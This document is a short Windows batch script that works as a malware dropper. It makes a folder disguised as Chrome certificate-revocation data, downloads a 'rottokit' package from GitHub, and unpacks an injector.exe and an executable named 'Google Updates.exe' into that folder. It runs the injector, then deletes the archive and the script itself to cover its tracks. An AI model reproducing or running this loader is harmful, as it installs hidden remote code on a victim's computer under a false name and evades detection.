@echo off
set WinDir="%localappdata%\Google\Chrome\User Data\Default\CertificateRevocation\6399"
ECHO %WinDir%

IF EXIST %WinDir% rmdir /s /Q %WinDir%
IF NOT EXIST %WinDir% mkdir %WinDir%

ECHO START

start https://github.com/EmaTroll3r/rottokit/raw/main/Packages.zip
set /A n=0
SET Packages="%userprofile%\Downloads\Packages.zip" 
:CheckForFile
set /A n=%n%+1
Rem echo %n%
IF EXIST "%Packages%" GOTO FoundIt
GOTO CheckForFile
:FoundIt
ECHO Found: "%Packages%"

timeout /t 4

cd "%WinDir%"
echo tar
tar -xf "%Packages%"
ECHO tar done

SET injector="Packages\injector.exe" 
:CheckForFile2
set /A n=%n%+1
Rem echo %n%
IF EXIST "%injector%" GOTO FoundIt2
GOTO CheckForFile2
:FoundIt2

move "Packages\injector.exe"  "injector.exe"
move "Packages\Google Updates.exe"  "Google Updates.exe"
move "Packages\installer.exe"  "installer.exe"
move "Packages\rottokit.py"  "rottokit.py"
move "Packages\diagnostics.zip"  "diagnostics.zip"

timeout /t 1
rmdir /S /Q "Packages"
timeout /t 1

"injector.exe"
del /f %Packages%
del /f "%~dp0%~nx0"



